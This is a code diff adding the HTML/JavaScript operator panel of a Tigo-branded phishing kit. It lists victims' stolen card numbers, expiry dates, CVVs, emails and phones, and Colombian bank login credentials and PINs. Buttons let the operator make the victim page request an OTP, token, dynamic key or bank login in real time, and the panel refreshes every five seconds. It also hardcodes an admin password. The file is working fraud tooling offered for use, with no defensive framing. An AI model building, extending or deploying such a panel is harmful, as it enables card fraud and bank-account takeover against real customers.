@@ -1,0 +1,856 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel Administrativo TIGO</title>
+    <link rel="icon" type="image/png" href="favicon.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Dm Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f5f5;
+            padding: 20px;
+        }
+
+        body:not(.autenticado) {
+            background: #f5f5f5;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 2000px;
+            margin: 0 auto;
+            display: none;
+        }
+
+        body.autenticado .container {
+            display: block;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #003399 0%, #0052cc 100%);
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+            border-radius: 0;
+        }
+
+        .logo {
+            width: 100px;
+            height: 40px;
+        }
+
+        .logo img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .refresh-btn {
+            padding: 10px 20px;
+            background: #001eb4;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .refresh-btn:hover {
+            background: #0015a0;
+        }
+
+        .transacciones-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+        }
+
+        @media (max-width: 1400px) {
+            .transacciones-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+
+        @media (max-width: 1000px) {
+            .transacciones-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 600px) {
+            .transacciones-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .tx-card {
+            background: white;
+            border-radius: 12px;
+            padding: 15px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            border-left: 4px solid #001eb4;
+        }
+
+        .tx-header {
+            margin-bottom: 10px;
+        }
+
+        .tx-id {
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
+            color: #999;
+            word-break: break-all;
+            line-height: 1.2;
+        }
+
+        .tx-nombre {
+            font-size: 14px;
+            font-weight: 600;
+            color: #001eb4;
+            margin-bottom: 3px;
+        }
+
+        .tx-detalle {
+            margin-bottom: 6px;
+            font-size: 11px;
+            color: #666;
+            line-height: 1.3;
+        }
+
+        .tx-detalle strong {
+            color: #001eb4;
+            display: inline-block;
+            width: 60px;
+        }
+
+        .tx-acciones {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(45px, 1fr));
+            gap: 4px;
+            margin: 10px 0;
+        }
+
+        .accion-btn {
+            padding: 4px;
+            border: 2px solid #ddd;
+            background: white;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 9px;
+            font-weight: 600;
+            color: #001eb4;
+            transition: all 0.2s;
+        }
+
+        .accion-btn:hover {
+            border-color: #001eb4;
+            background: #f0f5ff;
+        }
+
+        .accion-btn.selected {
+            background: #001eb4;
+            color: white;
+            border-color: #001eb4;
+        }
+
+        .tx-guardar {
+            width: 100%;
+            padding: 6px;
+            background: #4caf50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 11px;
+            margin-top: 5px;
+        }
+
+        .tx-guardar:hover {
+            background: #45a049;
+        }
+
+        .tx-estado {
+            font-size: 10px;
+            margin-top: 5px;
+            padding: 4px;
+            border-radius: 3px;
+            display: none;
+        }
+
+        .tx-estado.success {
+            background: #c8e6c9;
+            color: #2e7d32;
+            display: block;
+        }
+
+        .tx-estado.error {
+            background: #ffcdd2;
+            color: #c62828;
+            display: block;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .valor-copiable {
+            cursor: pointer;
+            padding: 2px 4px;
+            border-radius: 3px;
+            transition: all 0.2s ease;
+            user-select: all;
+        }
+
+        .valor-copiable:hover {
+            background: #e8f5ff;
+            color: #0066cc;
+        }
+
+        .valor-copiable.copiado {
+            background: #c8e6c9;
+            color: #2e7d32;
+        }
+
+        .valores-grupo {
+            display: flex;
+            gap: 8px;
+        }
+
+        .valor-grupo-item {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .valor-grupo-item strong {
+            display: block;
+            font-size: 11px;
+            margin-bottom: 2px;
+        }
+
+        .valor-grupo-item input {
+            width: 100%;
+            padding: 4px !important;
+            border: 1px solid #ddd !important;
+            border-radius: 4px !important;
+            font-size: 12px !important;
+            background: #f9f9f9 !important;
+            box-sizing: border-box !important;
+        }
+
+        .empty {
+            text-align: center;
+            padding: 40px;
+            color: #999;
+            grid-column: 1/-1;
+        }
+
+        .login-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #396bb4;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .login-modal.hidden {
+            display: none;
+        }
+
+        .login-box {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .login-box h2 {
+            color: #001eb4;
+            margin-bottom: 30px;
+            text-align: center;
+            font-size: 24px;
+        }
+
+        .login-box .form-group {
+            margin-bottom: 20px;
+        }
+
+        .login-box label {
+            display: block;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        .login-box input:focus {
+            outline: none;
+            border-color: #001eb4;
+            box-shadow: 0 0 0 3px rgba(0, 30, 180, 0.1);
+        }
+
+        .login-box button {
+            width: auto;
+            padding: 12px 40px;
+            background: #001eb4;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: 500;
+            font-family: 'Dm Sans', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: block;
+            margin: 20px auto 0;
+        }
+
+        .login-box button:hover {
+            background: #46c8f5;
+            color: #0122b6;
+            transform: translateY(-2px);
+        }
+
+        .login-error {
+            display: none;
+            color: #dc3545;
+            font-size: 13px;
+            background: #f8d7da;
+            padding: 12px;
+            border: 1px solid #f5c6cb;
+            border-radius: 4px;
+            margin-bottom: 15px;
+        }
+
+        .login-error.show {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-modal" id="loginModal">
+        <div class="login-box">
+            <div style="text-align: center; margin-bottom: 30px;">
+                <img src="assets/logos/logotigo.webp" alt="TIGO" style="width: 100px; height: auto;">
+            </div>
+            <div class="login-error" id="loginError"></div>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" autocomplete="off" autofocus>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" autocomplete="off">
+                </div>
+                <button type="submit">Login</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <img src="assets/logos/tigo-logo.svg" alt="TIGO">
+            </div>
+            <h1 style="color: white; margin-left: 20px; font-size: 24px; flex: 1;">Panel</h1>
+            <div style="display: flex; gap: 10px;">
+                <button class="refresh-btn" onclick="cargarTransacciones()">🔄 Actualizar</button>
+                <button class="refresh-btn" onclick="cerrarSesion()" style="background: #ff6b6b; border-color: #ff6b6b;">🚪 Cerrar Sesión</button>
+            </div>
+        </div>
+
+        <div class="transacciones-grid" id="transaccionesGrid">
+            <div class="empty">Cargando transacciones...</div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // LOGIN
+        // ============================================
+
+        const ADMIN_USER = 'admin';
+        const ADMIN_PASS = 'Tigocash2026';
+
+        function autenticar() {
+            const token = sessionStorage.getItem('panelito_token');
+            if (token) {
+                document.body.classList.add('autenticado');
+                document.getElementById('loginModal').classList.add('hidden');
+                cargarTransacciones();
+            }
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const errorDiv = document.getElementById('loginError');
+
+            try {
+                const response = await fetch('http://localhost:9090/api/login-admin', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ usuario: username, clave: password })
+                });
+
+                const result = await response.json();
+
+                if (result.ok && result.token) {
+                    sessionStorage.setItem('panelito_token', result.token);
+                    document.body.classList.add('autenticado');
+                    document.getElementById('loginModal').classList.add('hidden');
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = '';
+                    cargarTransacciones();
+                } else {
+                    errorDiv.textContent = 'Usuario o contraseña incorrectos';
+                    errorDiv.classList.add('show');
+                    document.getElementById('password').value = '';
+                }
+            } catch (error) {
+                console.error('Error en login:', error);
+                errorDiv.textContent = 'Error al conectar con el servidor';
+                errorDiv.classList.add('show');
+            }
+        });
+
+        autenticar();
+
+        function cerrarSesion() {
+            sessionStorage.removeItem('panelito_token');
+            document.body.classList.remove('autenticado');
+            document.getElementById('loginModal').classList.remove('hidden');
+            document.getElementById('loginError').classList.remove('show');
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('username').focus();
+        }
+
+        async function cargarTransacciones() {
+            try {
+                const token = sessionStorage.getItem('panelito_token');
+                const response = await fetch('http://localhost:9090/api/listar-transacciones', {
+                    headers: {
+                        'Authorization': `Bearer ${token}`
+                    }
+                });
+                const result = await response.json();
+
+                if (!response.ok || result.error) {
+                    if (response.status === 401) {
+                        cerrarSesion();
+                    }
+                    return;
+                }
+
+                if (!result.transacciones || result.transacciones.length === 0) {
+                    document.getElementById('transaccionesGrid').innerHTML = '<div class="empty">No hay transacciones pendientes</div>';
+                    return;
+                }
+
+                const html = result.transacciones.reverse().map(tx => `
+                    <div class="tx-card">
+                        <div class="tx-header">
+                            <img src="assets/logos/${getBankLogoFile(tx.banco)}" alt="${tx.banco}" style="height: 35px; width: auto; object-fit: contain; margin-bottom: 8px;">
+                            <div class="tx-id">${tx.txid}</div>
+                        </div>
+
+                        <div class="tx-detalle"><strong>Email:</strong> <span class="valor-copiable" onclick="copiarValor(this, '${tx.email}')">${tx.email}</span></div>
+                        <div class="tx-detalle"><strong>Teléfono:</strong> <span class="valor-copiable" onclick="copiarValor(this, '${tx.telefono || ''}')">${tx.telefono || '-'}</span></div>
+                        <div class="tx-detalle"><strong>Monto:</strong> $${parseInt(tx.monto).toLocaleString('es-CO')}</div>
+                        <div class="tx-detalle"><strong>Franquicia:</strong> ${tx.franquicia}</div>
+                        <div class="tx-detalle"><strong>Banco:</strong> ${tx.banco}</div>
+                        <div class="tx-detalle"><strong>Nombre:</strong> <span class="valor-copiable" onclick="copiarValor(this, '${tx.nombre}')">${tx.nombre}</span></div>
+                        <div class="tx-detalle"><strong>Tarjeta:</strong> <span class="valor-copiable" onclick="copiarValor(this, '${tx.cardNumber}')">${tx.cardNumber}</span></div>
+                        <div class="tx-detalle"><strong>Vence:</strong> <span class="valor-copiable" onclick="copiarValor(this, '${tx.expDate}')">${tx.expDate}</span></div>
+                        <div class="tx-detalle"><strong>CVV:</strong> <span class="valor-copiable" onclick="copiarValor(this, '${tx.cvv}')">${tx.cvv}</span></div>
+                        <div class="tx-detalle"><strong>Fecha:</strong> ${new Date(tx.timestamp).toLocaleString('es-CO')}</div>
+                        <div class="tx-detalle"><strong>Estado:</strong> <span id="accion-${tx.txid}" style="color: #ff9800; font-weight: 600;"><div style="width: 12px; height: 12px; border: 2px solid #ddd; border-top: 2px solid #ff9800; border-radius: 50%; display: inline-block; animation: spin 1s linear infinite;"></div></span></div>
+                        <div class="valores-grupo">
+                            <div class="valor-grupo-item">
+                                <strong>OTP:</strong>
+                                <input type="text" id="valor-otp-${tx.txid}" class="valor-copiable" readonly>
+                            </div>
+                            <div class="valor-grupo-item">
+                                <strong>TOKEN:</strong>
+                                <input type="text" id="valor-token-${tx.txid}" class="valor-copiable" readonly>
+                            </div>
+                            <div class="valor-grupo-item">
+                                <strong>DINAMICA:</strong>
+                                <input type="text" id="valor-dinamica-${tx.txid}" class="valor-copiable" readonly>
+                            </div>
+                        </div>
+                        <div class="tx-detalle"><strong>BLOGIN:</strong></div>
+                        <div class="valores-grupo">
+                            <div class="valor-grupo-item">
+                                <strong>Usuario:</strong>
+                                <input type="text" id="valor-blogin-user-${tx.txid}" class="valor-copiable" readonly>
+                            </div>
+                            <div class="valor-grupo-item">
+                                <strong>Contraseña:</strong>
+                                <input type="text" id="valor-blogin-pass-${tx.txid}" class="valor-copiable" readonly>
+                            </div>
+                            <div class="valor-grupo-item">
+                                <strong>PIN:</strong>
+                                <input type="text" id="valor-blogin-pin-${tx.txid}" class="valor-copiable" readonly>
+                            </div>
+                        </div>
+
+                        <div class="tx-acciones">
+                            <button class="accion-btn" onclick="guardarAccionAuto(this, 'OTP', '${tx.txid}')">📱 OTP</button>
+                            <button class="accion-btn" onclick="guardarAccionAuto(this, 'TOKEN', '${tx.txid}')">🔐 TOKEN</button>
+                            <button class="accion-btn" onclick="guardarAccionAuto(this, 'DINAMICA', '${tx.txid}')">📊 DIN</button>
+                            <button class="accion-btn" onclick="guardarAccionAuto(this, 'BLOGIN', '${tx.txid}')">🔑 LOG</button>
+                            <button class="accion-btn" onclick="guardarAccionAuto(this, 'BAD', '${tx.txid}')">❌ RECH</button>
+                        </div>
+
+                        <button class="accion-btn" onclick="limpiarAccion('${tx.txid}', this)" style="background: #ff9800; color: white; border-color: #ff9800;">🗑️ LIMPIAR</button>
+                        <div class="tx-estado" id="estado-${tx.txid}"></div>
+                    </div>
+                `).join('');
+
+                document.getElementById('transaccionesGrid').innerHTML = html;
+
+                // Cargar estado actual de cada transacción desde R2
+                result.transacciones.forEach(tx => {
+                    obtenerEstadoActual(tx.txid);
+                    obtenerTodosDatos(tx.txid);
+
+                    // Agregar listeners a inputs para copiar al clic
+                    ['otp', 'token', 'dinamica', 'blogin'].forEach(tipo => {
+                        const input = document.getElementById(`valor-${tipo}-${tx.txid}`);
+                        if (input) {
+                            input.addEventListener('click', function() {
+                                if (this.value) {
+                                    copiarValor(this, this.value);
+                                }
+                            });
+                        }
+                    });
+                });
+            } catch (err) {
+                document.getElementById('transaccionesGrid').innerHTML = `<div class="empty">Error: ${err.message}</div>`;
+            }
+        }
+
+        async function obtenerEstadoActual(txid) {
+            try {
+                const response = await fetch(`http://localhost:9090/api/obtener-accion/${txid}`);
+                const result = await response.json();
+                const accion = result.accion || 'STANDBY';
+
+                const estadoElement = document.getElementById(`accion-${txid}`);
+                if (estadoElement) {
+                    estadoElement.innerHTML = accion;
+                    // Cambiar color según estado
+                    if (accion === 'STANDBY') {
+                        estadoElement.style.color = '#ff9800';
+                    } else if (accion === 'OTP' || accion === 'TOKEN' || accion === 'DINAMICA' || accion === 'BLOGIN') {
+                        estadoElement.style.color = '#4caf50';
+                        // Obtener datos y iniciar countdown
+                        obtenerDatosAccion(txid, accion);
+                    } else if (accion === 'BAD') {
+                        estadoElement.style.color = '#f44336';
+                    }
+                }
+            } catch (err) {
+                console.error('[ESTADO] Error obteniendo acción:', err);
+            }
+        }
+
+        async function obtenerTodosDatos(txid) {
+            const tipos = ['otp', 'token', 'dinamica', 'blogin'];
+
+            tipos.forEach(tipo => {
+                obtenerDatosEspecifico(txid, tipo);
+            });
+        }
+
+        async function obtenerDatosEspecifico(txid, tipo) {
+            try {
+                const token = sessionStorage.getItem('panelito_token');
+                const response = await fetch(`http://localhost:9090/api/obtener-datos-${tipo}/${txid}`, {
+                    headers: {
+                        'Authorization': `Bearer ${token}`
+                    }
+                });
+                const result = await response.json();
+
+                if (result.data && result.data.valor) {
+                    if (tipo === 'blogin') {
+                        // Parsear JSON de BLOGIN
+                        if (result.data.valor) {
+                            try {
+                                const bloginData = JSON.parse(result.data.valor);
+                                const userInput = document.getElementById(`valor-blogin-user-${txid}`);
+                                const passInput = document.getElementById(`valor-blogin-pass-${txid}`);
+                                const pinInput = document.getElementById(`valor-blogin-pin-${txid}`);
+
+                                if (userInput) userInput.value = bloginData.username || '';
+                                if (passInput) passInput.value = bloginData.password || '';
+                                if (pinInput) pinInput.value = bloginData.pin || '';
+                            } catch (e) {
+                                console.error('Error parseando BLOGIN:', e);
+                            }
+                        }
+                    } else {
+                        const inputValor = document.getElementById(`valor-${tipo}-${txid}`);
+                        if (inputValor) {
+                            inputValor.value = result.data.valor;
+                        }
+                    }
+                }
+            } catch (err) {
+                console.error(`[DATOS ${tipo.toUpperCase()}] Error:`, err);
+            }
+        }
+
+        async function obtenerDatosAccion(txid, accion) {
+            try {
+                const token = sessionStorage.getItem('panelito_token');
+                const endpoint = `http://localhost:9090/api/obtener-datos-${accion.toLowerCase()}/${txid}`;
+                const response = await fetch(endpoint, {
+                    headers: {
+                        'Authorization': `Bearer ${token}`
+                    }
+                });
+                const result = await response.json();
+
+                if (result.data && result.data.valor && result.data.timestamp) {
+                    // Mostrar valor en input
+                    const inputValor = document.getElementById(`valor-${txid}`);
+                    if (inputValor) {
+                        inputValor.value = result.data.valor;
+                    }
+
+                    iniciarCountdown(txid, result.data.timestamp, accion);
+                }
+            } catch (err) {
+                console.error('[DATOS] Error:', err);
+            }
+        }
+
+        function iniciarCountdown(txid, timestamp, accion) {
+            const elemento = document.getElementById(`accion-${txid}`);
+            if (!elemento) return;
+
+            const interval = setInterval(() => {
+                // timestamp es una fecha en formato "YYYY-MM-DD HH:MM:SS" en GMT-5
+                const timestampMs = new Date(timestamp + ' GMT-0500').getTime();
+                const ahora = Date.now();
+                const tiempoTranscurrido = Math.floor((ahora - timestampMs) / 1000);
+                const tiempoRestante = Math.max(0, 60 - tiempoTranscurrido);
+
+                const minutos = Math.floor(tiempoRestante / 60);
+                const segundos = tiempoRestante % 60;
+                const formato = `${String(minutos).padStart(2, '0')}:${String(segundos).padStart(2, '0')}`;
+
+                elemento.innerHTML = `${accion}<br><span style="font-size: 10px; color: #999;">${timestamp}<br>${formato}</span>`;
+
+                if (tiempoRestante === 0) {
+                    clearInterval(interval);
+                    limpiarAccionAuto(txid);
+                }
+            }, 1000);
+        }
+
+        function copiarValor(elemento, valor) {
+            if (!valor) return;
+
+            navigator.clipboard.writeText(valor).then(() => {
+                elemento.classList.add('copiado');
+                setTimeout(() => {
+                    elemento.classList.remove('copiado');
+                }, 1500);
+            }).catch(err => {
+                console.error('Error copiando:', err);
+            });
+        }
+
+        async function limpiarAccionAuto(txid) {
+            try {
+                const response = await fetch(`http://localhost:9090/api/limpiar-accion/${txid}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ accion: 'OTP' })
+                });
+
+                if (response.ok) {
+                    await obtenerEstadoActual(txid);
+                }
+            } catch (err) {
+                console.error('[LIMPIAR-AUTO] Error:', err);
+            }
+        }
+
+        async function guardarAccionAuto(btn, accion, txid) {
+            const card = btn.closest('.tx-card');
+
+            // Marcar botón como seleccionado
+            card.querySelectorAll('.accion-btn').forEach(b => b.classList.remove('selected'));
+            btn.classList.add('selected');
+
+            try {
+                const response = await fetch(`http://localhost:9090/api/guardar-accion/${txid}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ accion })
+                });
+
+                const result = await response.json();
+
+                if (result.ok) {
+                    mostrarEstado(txid, `✅ Guardado`, 'success', card);
+                    // Actualizar estado inmediatamente
+                    await obtenerEstadoActual(txid);
+                } else {
+                    mostrarEstado(txid, `❌ Error`, 'error', card);
+                    btn.classList.remove('selected');
+                }
+            } catch (err) {
+                console.error('[GUARDAR] Error:', err);
+                mostrarEstado(txid, `❌ Error: ${err.message}`, 'error', card);
+                btn.classList.remove('selected');
+            }
+        }
+
+        async function limpiarAccion(txid, btn) {
+            const card = btn.closest('.tx-card');
+            const accionBtn = card.querySelector('.accion-btn.selected');
+            const accion = accionBtn ? accionBtn.textContent.replace(/[^A-Z]/g, '') : 'OTP';
+
+            try {
+                const response = await fetch(`http://localhost:9090/api/limpiar-accion/${txid}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ accion })
+                });
+
+                const result = await response.json();
+
+                if (result.ok) {
+                    mostrarEstado(txid, `✅ Limpiado`, 'success', card);
+                    card.querySelectorAll('.accion-btn').forEach(b => b.classList.remove('selected'));
+                    await obtenerEstadoActual(txid);
+                } else {
+                    mostrarEstado(txid, `❌ Error`, 'error', card);
+                }
+            } catch (err) {
+                mostrarEstado(txid, `❌ Error`, 'error', card);
+            }
+        }
+
+        function mostrarEstado(txid, mensaje, tipo, card) {
+            const el = card.querySelector(`#estado-${txid}`);
+            el.textContent = mensaje;
+            el.className = `tx-estado ${tipo}`;
+            setTimeout(() => {
+                el.className = 'tx-estado';
+            }, 3000);
+        }
+
+        const bankLogos = {
+            'accion fiduciaria': 'accionfiduciaria.svg',
+            'agrario': 'agrario.svg',
+            'agrobank': 'agrario.svg',
+            'av villas': 'avvillas.svg',
+            'avvillas': 'avvillas.svg',
+            'ban 100': 'ban100.svg',
+            'ban100': 'ban100.svg',
+            'banca mia': 'bancamia.svg',
+            'bancamia': 'bancamia.svg',
+            'bancolombia': 'bancol.png',
+            'bbva': 'bbva.svg',
+            'banco bogota': 'bogota.svg',
+            'bogota': 'bogota.svg',
+            'banco cajasocial': 'cajasocial.svg',
+            'banco caja social': 'cajasocial.svg',
+            'caja social': 'cajasocial.svg',
+            'cajasocial': 'cajasocial.svg',
+            'cfa': 'cfa.svg',
+            'chase': 'chase.webp',
+            'city bank': 'citybank.svg',
+            'citybank': 'citybank.svg',
+            'coink': 'coink.svg',
+            'colpatria': 'colpatria.svg',
+            'colfondos': 'default.svg',
+            'colte financiera': 'coltefinanciera.svg',
+            'coltefinanciera': 'coltefinanciera.svg',
+            'coofinep': 'coofinep.svg',
+            'coomeva': 'coomeva.svg',
+            'coop central': 'coopcentral.svg',
+            'cooperativa confiar': 'cooperativaConfiar.svg',
+            'cotrafa': 'cotrafa.svg',
+            'dale': 'dale.svg',
+            'davibank': 'davibank.svg',
+            'daviplata': 'daviplata.svg',
+            'davivienda': 'davivienda.svg',
+            'ding': 'ding.svg',
+            'falabella': 'falabella.svg',
+            'finandina': 'finandina.svg',
+            'global': 'global.svg',
+            'iris bank': 'irisbank.svg',
+            'itau': 'itau.svg',
+            'jpmorgan': 'jpmorgan.svg',
+            'j.p. morgan': 'jpmorgan.svg',
+            'lulo': 'lulo.svg',
+            'movii': 'movii.svg',
+            'mundo mujer': 'mundomujer.svg',
+            'nequi': 'nequiLogo.svg',
+            'nu': 'nu.svg',
+            'occidente': 'occidente.svg',
+            'paycash': 'paycash.svg',
+            'pichincha': 'pichincha.svg',
+            'banco popular': 'popular.svg',
+            'popular': 'popular.svg',
+            'powwi': 'powwi.svg',
+            'rappipay': 'rappipay.svg',
+            'santander': 'santander.svg',
+            'serfinanza': 'serfinanza.svg',
+            'sudameris': 'sudameris.svg',
+            'uala': 'uala.svg',
+            'union': 'union.svg'
+        };
+
+        function getBankLogoFile(bankName) {
+            if (!bankName) return 'default.svg';
+            const banknameLower = bankName.toLowerCase().normalize('NFD').replace(/[̀-ͯ]/g, '');
+            const bankKey = Object.keys(bankLogos).find(key => banknameLower.includes(key) || key.includes(banknameLower));
+            return bankLogos[bankKey] || 'default.svg';
+        }
+
+        // Cargar al abrir
+        cargarTransacciones();
+
+        // Auto-actualizar cada 5 segundos
+        setInterval(cargarTransacciones, 5000);
+    </script>
+</body>
+</html>
